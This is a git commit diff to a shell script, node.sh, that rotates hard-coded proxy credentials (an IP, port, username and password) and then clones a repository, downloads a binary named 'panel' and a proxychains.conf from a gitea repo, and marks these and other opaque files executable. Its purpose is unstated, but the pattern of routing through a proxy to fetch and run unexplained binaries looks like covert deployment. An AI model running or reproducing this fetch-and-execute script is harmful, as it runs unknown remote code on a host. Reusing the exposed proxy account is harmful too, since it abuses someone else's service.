0fe5e0216ff333d42e3613a3825775dac28b107c
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2023-12-26 08:48:52 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -1,7 +1,7 @@
 proxy="38.154.227.167" 
 port="5868" 
-user="ugursfso"  
-pass="wqn60pnk6m95" 
+user="nrrmfinr"  
+pass="9rrin80d68ba" 
 git clone https://github.com/55113110159/render.git && cd render && chmod +x config.json && chmod +x zepo
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
